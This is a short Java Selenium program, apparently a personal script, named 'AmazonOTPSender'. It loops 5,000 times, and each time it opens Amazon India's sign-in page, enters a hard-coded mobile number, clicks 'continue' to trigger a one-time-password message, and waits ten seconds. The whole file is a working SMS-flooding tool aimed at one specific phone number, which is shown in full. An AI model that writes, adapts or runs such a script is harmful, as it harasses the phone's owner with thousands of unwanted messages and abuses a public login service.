package Day1;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;

public class AmazonOTPSender {

	public static void main(String[] args) throws InterruptedException 
	{
		
		for(int i=0;i<5000;i++)
		{
			String mobileNumber="9833247537";
			
			// TODO Auto-generated method stub
			// chrome
			//System.setProperty("webdriver.chrome.driver", "D:\\CT TP\\Java Selinium Training Content\\Drivers\\chromedriver.exe");
			//WebDriver driver=new ChromeDriver();
			
			System.setProperty("webdriver.chrome.driver", "C:\\Rakesh\\Office Stuff\\BC App Onbaording\\BC_OPS_INTENSE\\BC_OPS_INTENSE\\src\\test\\resources\\drivers\\chromedriver.exe");
			WebDriver driver=new ChromeDriver();
			driver.get("https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
			
			driver.findElement(By.id("ap_email")).sendKeys(mobileNumber);
			driver.findElement(By.id("continue")).click();
			Thread.sleep(10);
			driver.findElement(By.id("continue")).click();
			
			driver.close();
			Thread.sleep(10000);
			System.out.println(i+1);
		}
		
	}

}
